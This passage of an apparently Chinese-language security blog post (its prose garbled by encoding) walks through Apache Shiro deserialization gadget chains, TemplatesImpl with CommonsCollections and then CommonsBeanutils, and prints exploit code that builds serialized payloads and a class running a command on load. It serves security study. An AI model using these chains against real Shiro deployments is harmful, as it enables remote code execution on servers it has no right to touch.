<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassResolvingObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassResolvingObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>åŒºåˆ«å°±æ˜¯å‰è€…ç”¨çš„æ˜¯ org.apache.shiro.util.ClassUtils#forName ï¼ˆå®é™…ä¸Šå†…éƒ¨ç”¨åˆ°äº†org.apache.catalina.loader.ParallelWebappClassLoader#loadClass ï¼‰ï¼Œè€Œåè€…ç”¨çš„æ˜¯JavaåŸ ç”Ÿçš„ Class.forName ã€‚</p>
<p>å¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ã€‚</p>
</blockquote>
<h5 id="TemplateImpl-Attack"><a href="#TemplateImpl-Attack" class="headerlink" title="TemplateImpl Attack"></a>TemplateImpl Attack</h5><p>Pç¥çš„expï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollectionsShiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getPayload(<span class="keyword">byte</span>[] clazzBytes) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getClass&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­¦ä¹ CC3çš„æ—¶å€™å­¦åˆ°çš„TemolateImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;null&quot;</span>); <span class="comment">// ä¸ä¸ºç©ºå°±å¥½ æ— è¦æ±‚</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl()); <span class="comment">// defineTransletClassesæ–¹æ³•ä¸­ä¼šå­˜åœ¨è°ƒç”¨ é˜²æ­¢æŠ¥é”™</span></span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨åˆ©ç”¨<code>TemplatesImpl</code>çš„æ—¶å€™ï¼Œè¿˜æ˜¯ç”¨åˆ°äº†<code>Transformer</code>æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º<code>ConstantTransformer</code>ä¸»è¦æ˜¯ç”¨æ¥å®ä¾‹åŒ–<code>TrAXFilter</code>ï¼Œå› ä¸ºåœ¨è¿™ä¸ªç±»çš„åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°<code>TemplatesImpl#newTransformer</code>ä»è€Œå®Œæˆæ•´ä¸ªGadget</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">           <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">           <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                 <span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">                 <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨Â·CC6çš„é“¾å­ä¸­ä¼šç”¨åˆ°<code>TiedMapEntry</code>ï¼Œç”¨äºé€šè¿‡<code>getvalue</code>æ–¹æ³•è§¦å‘<code>LazyMap#get</code>æ–¹æ³•ï¼Œè¿™é‡Œä¹Ÿä¼šè§¦å‘åˆ°<code>transform</code>æ–¹æ³•ï¼Œè€Œkeyåˆ™æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„<code>TemplatesImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨åˆ°äº†<code>InvokeTransform#transform</code>ï¼Œå®ç°æŠŠ<code>TemplatesImpl</code>è¿›è¡Œå®ä¾‹åŒ–ï¼Œå¹¶æ‰§è¡Œå…¶æ–¹æ³•ï¼Œè€Œè¿™é‡Œçš„<code>this.iMethodName</code>åˆæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ‰€ä»¥å¦‚æœæŠŠ<code>this.iMethodName</code>èµ‹å€¼ä¸º<code>newTransformer</code>ä¸å°±å¯ä»¥å®ç°RCEäº†å˜›</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0b49927ef99643d298241d7a989fc489.png" alt="image-20220629110957407"></p>
<blockquote>
<p>Shiroä¸æ˜¯é‡åˆ°Tomcatå°±ä¸€å®šä¼šæœ‰æ•°ç»„è¿™ä¸ªé—®é¢˜ </p>
<p>Shiro-550çš„ä¿®å¤å¹¶ä¸æ„å‘³ç€ååºåˆ—åŒ–æ¼æ´çš„ä¿®å¤ï¼Œåªæ˜¯é»˜è®¤Keyè¢«ç§»é™¤äº† </p>
<p>ç½‘ä¸Šå¤§éƒ¨åˆ†çš„æ–‡ç« ä¸Šæ¥å°±æ˜¯è£…ä¸€ä¸ªcommons-collections4.0ï¼Œè¿™ä¸ªæ˜¯æ²¡æœ‰ä»£è¡¨æ€§çš„ï¼Œä¸å»ºè®®å°†è¿™äºŒ è€…ç»“åˆèµ·æ¥å­¦ä¹ </p>
</blockquote>
<h4 id="æ— CCæ”»å‡»shiro"><a href="#æ— CCæ”»å‡»shiro" class="headerlink" title="æ— CCæ”»å‡»shiro"></a>æ— CCæ”»å‡»shiro</h4><h5 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€»çš„æ¥è¯´åªå­˜åœ¨<code>setter</code>å’Œ<code>getter</code>æ–¹æ³•çš„ç±»ç§°ä¸º<code>JavaBean</code></p>
<h5 id="Apache-Commons-Beanutils"><a href="#Apache-Commons-Beanutils" class="headerlink" title="Apache Commons Beanutils"></a>Apache Commons Beanutils</h5><p>æµ‹è¯•ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Ameuu&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> Test(), <span class="string">&quot;name&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æä¾›äº†é™æ€æ–¹æ³•<code>PropertyUtils.getProperty()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨åˆ°<code>PropertyUtilsBean#getNestedProperty</code>ï¼Œå› ä¸ºæµ‹è¯•ç±»åªæœ‰ä¸€ä¸ªå±æ€§æ‰€ä»¥ä¼šç›´æ¥åˆ°æœ€åä¸€ä¸ªelseï¼Œè°ƒç”¨åˆ°<code>getSimpleProperty</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getNestedProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">       â€¦â€¦</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>.resolver.hasNested(name)) &#123;</span><br><span class="line">            â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">           â€¦â€¦</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bean = <span class="keyword">this</span>.getSimpleProperty(bean, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>getSimpleProperty</code>ä¼šåœ¨æœ€åè·å–å…³äºè¿™ä¸ªç±»çš„å±æ€§çš„æè¿°ï¼Œå†è°ƒç”¨ç›¸åº”çš„getterè·å–å±æ€§å€¼ï¼Œå®ç°ä¸ç›´æ¥ç”¨<code>getter</code>è·å–åˆ°å±æ€§çš„å€¼</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getSimpleProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bean == <span class="keyword">null</span>) &#123;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> DynaBean) &#123;</span><br><span class="line">        â€¦â€¦</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PropertyDescriptor descriptor = <span class="keyword">this</span>.getPropertyDescriptor(bean, name);</span><br><span class="line">        <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(<span class="string">&quot;Unknown property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Method readMethod = <span class="keyword">this</span>.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line">            <span class="keyword">if</span> (readMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(<span class="string">&quot;Property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object value = <span class="keyword">this</span>.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8168b835365e4324851977056958a1dd.png" alt="image-20220629145746755"></p>
<p>æ‰§è¡Œ<code>getName(getter)</code>è·å–å†…å®¹</p>
<p><img src="https://img-blog.csdnimg.cn/1b280455a9954442aa522f0c79fc7f17.png" alt="image-20220629145916030"></p>
<h5 id="åˆ©ç”¨getter"><a href="#åˆ©ç”¨getter" class="headerlink" title="åˆ©ç”¨getter"></a>åˆ©ç”¨getter</h5><p>æœ¬æ¬¡é“¾å­è¿˜æ˜¯éœ€è¦ç”¨åˆ°<code>TemplatesImpl</code>ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯è¦æ‰¾åˆ°è¯¥æ€ä¹ˆè§¦å‘åˆ°``TemplatesImpl#newTransformer`ä»è€Œå®ç°RCE</p>
<p>å°±æ¯”å¦‚å‰é¢è¿ç”¨è¿‡çš„<code>TrAXFilter</code>ï¼Œç„¶åä¹Ÿä¸è¦å¿˜äº†ä¸€å¼€å§‹åœ¨åˆ†æ<code>TemplatesImpl</code>é“¾å­çš„æ—¶å€™å®ƒè‡ªèº«çš„<code>getOutputProperties</code>å…¶å®å°±ä¼šè°ƒç”¨åˆ°<code>newTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†ç»“åˆå‰é¢æ‰€å­¦çš„<code>PropertyUtils.getProperty()</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°è°ƒç”¨åˆ°<code>getOutputProperties</code>æ–¹æ³•</p>
<p>è¿™é‡Œç”¨åˆ°çš„æ˜¯<code>org.apache.commons.beanutils.BeanComparator</code>ï¼Œè€Œä»–çš„compareæ–¹æ³•å°±è°ƒç”¨åˆ°äº†<code> PropertyUtils.getProperty</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);</span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.comparator.compare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æ„é€ é“¾å­"><a href="#æ„é€ é“¾å­" class="headerlink" title="æ„é€ é“¾å­"></a>æ„é€ é“¾å­</h5><p>Exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘ç”Ÿæˆå­—èŠ‚ç </p>
<p><img src="https://img-blog.csdnimg.cn/edcf9c44853a415e83fc9c20b10bfa3a.png" alt="image-20220629162937904"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteInputStream;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CBShiroTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// å‘½ä»¤ è¿™é‡Œç”¨äº†javassistè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());</span><br><span class="line">        <span class="comment">// ä¸ç”¨javassist</span></span><br><span class="line">         <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span 